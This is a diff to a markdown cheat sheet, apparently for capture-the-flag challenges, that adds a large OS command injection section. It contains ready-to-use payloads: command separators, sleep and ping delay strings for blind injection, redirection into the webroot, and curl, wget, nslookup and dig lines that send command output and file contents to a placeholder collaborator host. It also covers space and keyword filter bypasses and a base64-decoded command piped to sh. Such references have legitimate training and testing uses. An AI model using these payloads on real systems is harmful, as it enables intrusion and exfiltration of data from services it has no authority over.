@@ -68,27 +68,144 @@ echo "<BASE64_STRING>" | base64 -d
 
 ---
 
-## 4. Command Injection Bypasses
+## 4. OS Command Injection
 
-### Space Replacement
-Use environment variables or file redirection when spaces are blocked:
+### Command Separators
+Inject before, between, or after parameters depending on the underlying shell command:
+- Semicolon (sequential): `; id`
+- Background operator: `& id &`
+- AND operator (runs if left side succeeds): `&& id`
+- OR operator (runs if left side fails): `|| id`
+- Pipe operator (sends output to input): `| id`
+- Newline character (essential when regex anchors match `^...$`): `%0a id %0a`
+- Inline execution / subshell: `$(id)` or `` `id` ``
+
+---
+
+### Blind Command Injection: Time Delays
+
+Use when the server executes the command but reflects no output on the webpage:
+
+#### Linux Targets (sleep and ping)
+```text
+# Using sleep:
+; sleep 10 ;
+& sleep 10 &
+| sleep 10
+|| sleep 10
+`sleep 10`
+$(sleep 10)
+%0a sleep 10 %0a
+
+# Using ping (-c is packet count):
+; ping -c 10 127.0.0.1 ;
+& ping -c 10 127.0.0.1 &
+| ping -c 10 127.0.0.1
+|| ping -c 10 127.0.0.1 ||
+```
+URL-encoded example (with space as `+`):
+```text
+email=test%40test.com||ping+-c+10+127.0.0.1||
+```
+
+#### Windows Targets (timeout and ping)
+```text
+# Using ping (-n is packet count):
+& ping -n 10 127.0.0.1 &
+| ping -n 10 127.0.0.1
+|| ping -n 10 127.0.0.1 ||
+
+# Using timeout:
+& timeout /t 10 &
+|| timeout /t 10 ||
+```
+
+---
+
+### Blind Command Injection: Output Redirection
+
+When command execution is blind, but the webroot is writable:
+```text
+# Redirect command output to webroot
+|| id > /var/www/html/whoami.txt ||
+|| cat /flag* > /var/www/html/static/flag.txt ||
+; cat /flag.txt > /var/www/html/images/flag.txt ;
+```
+Then retrieve the output directly through your browser:
+```text
+http://<TARGET_IP>/whoami.txt
+http://<TARGET_IP>/static/flag.txt
+```
+
+---
+
+### Blind Command Injection: Out-of-Band (OOB) Exfiltration
+
+When no output is displayed and webroot is read-only, exfiltrate data through network requests:
+
+#### HTTP Exfiltration (curl / wget)
+Send captured flag or command output to your Burp Collaborator, webhook, or listener:
+```text
+# Using curl:
+|| curl http://<YOUR_IP_OR_COLLABORATOR>/?data=$(whoami) ||
+|| curl -d "$(cat /flag*)" http://<YOUR_IP_OR_COLLABORATOR>/ ||
+
+# Using wget:
+|| wget http://<YOUR_IP_OR_COLLABORATOR>/$(cat /flag* | base64) ||
+```
+
+#### DNS Exfiltration (nslookup / dig)
+DNS often bypasses strict outbound firewalls when HTTP ports are blocked:
+```text
+# Using nslookup:
+|| nslookup $(whoami).<YOUR_COLLABORATOR_DOMAIN> ||
+|| nslookup $(cat /flag* | base64 | tr -d '\n').<YOUR_COLLABORATOR_DOMAIN> ||
+
+# Using dig:
+|| dig $(cat /flag* | tr ' ' '_').<YOUR_COLLABORATOR_DOMAIN> ||
+```
+
+---
+
+### Filter Bypasses for Command Injection
+
+#### 1. Space Character Blocked
 ```bash
 cat$IFS/flag.txt
 cat${IFS}/flag.txt
 cat<$IFS/flag.txt
+cat</flag.txt
 {cat,/flag.txt}
 ```
 
-### Keyword Obfuscation
-Concatenate empty strings or quotes:
+#### 2. Slash (`/`) Blocked
 ```bash
+# Using environment variables (e.g. $PATH starts with /)
+cat ${PATH:0:1}flag.txt
+
+# Using directory navigation
+cd .. && cd .. && cat flag.txt
+```
+
+#### 3. Keywords Blocked (e.g. `cat` or `flag`)
+```bash
+# Empty quotes
 c''at /fl*
 c""at /fl?g
 c\at /f'l'ag.txt
-```
 
-Execute base64-encoded command:
-```bash
+# Alternative readers
+more /flag*
+less /flag*
+head /flag*
+tail /flag*
+tac /flag*
+nl /flag*
+xxd /flag*
+base64 /flag*
+strings /flag*
+
+# Base64 pipe execution
 echo "Y2F0IC9mbGFn" | base64 -d | sh
 ```
 
